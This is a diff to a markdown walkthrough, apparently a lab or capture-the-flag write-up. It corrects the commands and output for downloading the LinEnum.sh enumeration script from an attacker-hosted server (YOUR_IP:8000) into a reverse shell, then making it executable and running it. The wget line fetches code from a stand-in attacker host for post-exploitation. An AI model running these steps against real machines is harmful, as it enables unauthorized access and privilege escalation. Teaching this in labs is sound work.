@@ -84,23 +84,18 @@ python -m SimpleHTTPServer
 
 Change into the /tmp directory on your reverse shell, we can use the _wget_ command to put LinEnum.sh on the machine so we can run it.
 ```markdown
-$ wget YOUR_IP:8000 LinEnum.sh
---2020-06-17 15:29:50--  http://YOUR_IP:8000/
+$ wget YOUR_IP:8000/LinEnum.sh
+--2020-06-17 15:36:21--  http://YOUR_IP:8000/LinEnum.sh
 Connecting to YOUR_IP:8000... connected.
 HTTP request sent, awaiting response... 200 OK
-Length: 218 [text/html]
-Saving to: ‘index.html’
+Length: 46631 (46K) [text/x-sh]
+Saving to: ‘LinEnum.sh’
 
-     0K                                                       100% 30.3M=0s
+     0K .......... .......... .......... .......... .....     100%  106K=0.4s
 
-2020-06-17 15:29:50 (30.3 MB/s) - ‘index.html’ saved [218/218]
-
---2020-06-17 15:29:50--  http://linenum.sh/
-Resolving linenum.sh (linenum.sh)... failed: Name or service not known.
-wget: unable to resolve host address ‘linenum.sh’
-FINISHED --2020-06-17 15:29:51--
-Total wall clock time: 0.7s
-Downloaded: 1 files, 218 in 0s (30.3 MB/s)
+2020-06-17 15:36:22 (106 KB/s) - ‘LinEnum.sh’ saved [46631/46631]
 ```
 
-Now let's make it an executable file, by using _chmod +x LinEnum.sh_. Run LinEnum by using `./LinEnum.sh`
+Now let's make it an executable file, by using _chmod +x LinEnum.sh_. Run LinEnum by using "./LinEnum.sh"
+
+
